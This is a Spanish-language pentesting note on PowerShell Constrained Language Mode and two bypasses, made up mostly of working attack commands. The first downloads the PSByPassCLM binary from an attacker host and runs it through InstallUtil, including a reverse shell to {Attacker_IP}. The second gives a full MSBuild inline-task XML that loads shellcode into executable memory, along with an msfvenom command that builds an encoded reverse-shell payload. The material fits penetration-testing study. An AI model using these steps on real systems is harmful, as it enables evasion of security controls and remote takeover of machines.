-----
- Tags: #bypass #teoria #practica #windows 
-----
# Constrained Language Mode (CLM)

El **Constrained Language Mode** (**CLM**) es una característica de seguridad que limita las capacidaddes del intérprete de *PowerShell* para reducir el riesgo de ejecución de comandos malicosos o no autorizados. Es una parte importante de las medidas de seguridad de PowerShell.

Cunado se habilita el CLM, se restringen muchas de las capacidades avanzadas de PowerShell, como la ejecución de scripts y comandos no firmados, el acceso a ciertos objetos y propiedades del sistema, y la posibilidad de cargar módulos no confiables. Esto se hace para reducir el riesgo de ataques que pueden aprovechar las capacidades avanzadas de PowerShell para ejecutar códgio malicoso.

Para validar si estamos en una sesión CLM podemos ejecutar el comando:

```powershell
$ExecutionContext.SessionState.LanguageMode
```

----
# Bypass de CLM

Los **bypass de Constrained Language Mode** son  una técnica o métodos utilizados para eludir o sortear el modo de lenguaje restringido (CLM) en PowerShell. Los *bypass* son una técnica utilizada por los atacntes para evadir las restricciones del CLM y ejecutar comandos en PowerShell de manera no autorizada. 
#### Bypass 1

Comandos a ejecutar en la máquina atacante:
```bash
git clone https://github.com/padovah4ck/PSByPassCLM

cd PSByPassCLM/PSBypassCLM/PSBypassCLM/bin/{arquitectura}/Debug

python3 -m http.server {port}
```

Comandos a ejecutar en la máquina víctima:
```powershell
Invoke-WebRequest -uri 'http://{Attacker_IP}/{port}/PsBypassCLM.exe' -Outfile '{name}'
```

Una vez transferido el binario, en el repositorio de la herramienta [PsBypassCLM](https://github.com/padovah4ck/PSByPassCLM) se nos indica un one liner a ejecutar, en caso de querer abrir una subconsola haciendo uso de la consola obtenida:

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U 'C:\{path}\{to}\{our}\{binary}\PsBypassCLM.exe'
```

O en caso de querer obtener una reverse shell a un puerto de nuestra máquina de atacante, el siguiente comando:

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost={Attacker_IP} /rport={port} /U 'C:\{path}\{to}\{our}\{binary}\PsBypassCLM.exe'
```

En cualquiera de los casos, sabremos que bypaseamos de manera exitosa esta restricción del CLM al ejecutar el comando:

```powershell
$ExecutionContext.SessionState.LanguageMode
```

Y obtener una respuesta con el output de **FullLanguage**. 

----
#### Bypass 2 

En este caso podríamos hacer uso del [recurso](https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/) para bypassear el **CLM** haciendo uso de **MSBuild.exe**.

Podríamos descargar el [archivo.xml](https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml) el cual posteriormente modificariamos para inyectar nuestro propio **shellcode**.

Archivo.xml malicioso:
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee --> 
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {
			< --------------------- SHELL CODE TO INSERT HERE --------------------- >
              
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Una vez descargado el archivo malicioso xml, deberiamos ingresar nuestro shellcode, para generarlo podemos hacer uso de **msfvenom**:

```bash
msfvenom --platform {platform} -a x86 -p windows/shell_reverse_tcp LHOST={Attacker_IP} LPORT={Attacker_PORT} -f csharp -e x86/shikata-ganai -i 20 -v shellcode
```

Una vez generado, lo insertariamos en el archivo .xml malicioso y ya editado el mismo deberiamos de subirlo a la máquina víctima con extensio *.csproj*:

```powershell
> C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe {file_uploaded}.csproj
```

En caso de ejecutar el anterior comando, estaríamos logrando ejecutar el **shellcode** ingresado, y como lo que hicimos fue generar un shellcode el cual envia una reverse shell a nuestro equipo por un determinado puerto, deberiamos recibir la conexión por el mismo.
